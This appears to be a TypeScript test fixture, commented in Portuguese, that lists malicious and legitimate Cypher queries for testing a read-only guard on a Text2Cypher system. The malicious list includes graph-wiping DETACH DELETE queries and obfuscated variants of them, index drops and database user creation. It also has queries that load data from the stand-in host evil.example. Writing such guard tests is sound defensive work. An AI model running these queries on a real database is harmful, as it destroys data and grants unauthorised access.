/**
 * As entradas da guarda do Text2Cypher (F7.10): as maliciosas e as legítimas, compartilhadas pelo teste sem banco
 * (`guarda.test.ts`) e pelo teste contra o grafo real (`guarda.integracao.test.ts`), como no Python.
 */

export const MALICIOSAS: [string, string][] = [
  ["create", "CREATE (n:Intruso {x: 1}) RETURN n"],
  ["merge", "MERGE (n:Intruso {x: 1}) RETURN n"],
  ["delete", "MATCH (n) DELETE n"],
  ["detach_delete", "MATCH (n) DETACH DELETE n"],
  ["set", "MATCH (f:FinancialFact) SET f.value = 0 RETURN f"],
  ["remove", "MATCH (n) REMOVE n.value RETURN n"],
  ["mistura_de_caixa", "MATCH (n) dEtAcH DeLeTe n"],
  ["quebra_de_linha", "MATCH (n)\nDETACH\n\tDELETE n"],
  ["comentario_no_meio", "MATCH (n) DETACH /* só olhando */ DELETE n"],
  ["comentario_de_linha", "MATCH (n) DETACH // x\nDELETE n"],
  ["depois_de_ponto_e_virgula", "MATCH (n) RETURN n LIMIT 1; MATCH (m) DETACH DELETE m"],
  ["foreach", "MATCH (n) FOREACH (x IN [1] | SET n.v = x)"],
  ["drop_indice", "DROP INDEX entity_vec"],
  ["criar_indice", "CREATE INDEX x FOR (n:Metric) ON (n.name)"],
  ["load_csv", "LOAD CSV FROM 'http://evil.example/x.csv' AS l RETURN l"],
  ["apoc_escrita", "CALL apoc.cypher.runWrite('CREATE (n)', {}) YIELD value RETURN value"],
  ["apoc_periodic", "CALL apoc.periodic.iterate('MATCH (n) RETURN n', 'DELETE n', {batchSize: 10})"],
  ["apoc_rede", "CALL apoc.load.json('http://evil.example/x.json') YIELD value RETURN value"],
  ["dbms", "CALL dbms.security.createUser('x', 'y', false)"],
  ["subconsulta_em_transacoes", "CALL { MATCH (n) DETACH DELETE n } IN TRANSACTIONS"],
  ["show_usuarios", "SHOW USERS"],
  ["use_system", "USE system CREATE USER x SET PASSWORD 'y'"],
  ["caractere_de_controle", "MATCH (n) RETURN n\u0000 DETACH DELETE n"],
  ["muito_longa", `MATCH (n) WHERE n.id IN [${Array(20000).fill("'x'").join(", ")}] RETURN n`],
  ["limit_calculado", "MATCH (n) RETURN n LIMIT toInteger('99999999')"],
  ["sem_leitura", "EXPLAIN MATCH (n) RETURN n"],
];

export const LEGITIMAS = [
  "MATCH (f:FinancialFact) WHERE f.metric = 'Set up and delete costs' RETURN f.value AS v LIMIT 5",
  "MATCH (n:Metric) WHERE n.set = 1 RETURN n.name AS nome LIMIT 5",
  "MATCH (n:Metric) RETURN n.`delete` AS d, n.createdAt AS c LIMIT 5",
  "MATCH (f:FinancialFact) RETURN 'LOAD CSV e DROP INDEX são só texto' AS aviso LIMIT 1",
  "MATCH (f:FinancialFact) RETURN f.value AS v /* contagem */ LIMIT 5",
  "MATCH (f:FinancialFact) // todos os fatos\nRETURN count(f) AS total",
  "OPTIONAL MATCH (f:FinancialFact) RETURN count(f) AS total",
  "WITH 1 AS x RETURN x AS x",
  "UNWIND [1, 2] AS x RETURN x AS x",
  "MATCH (f:FinancialFact) CALL { WITH f MATCH (f)-[:FOR_PERIOD]->(p) RETURN p.id AS p } RETURN p LIMIT 3",
];
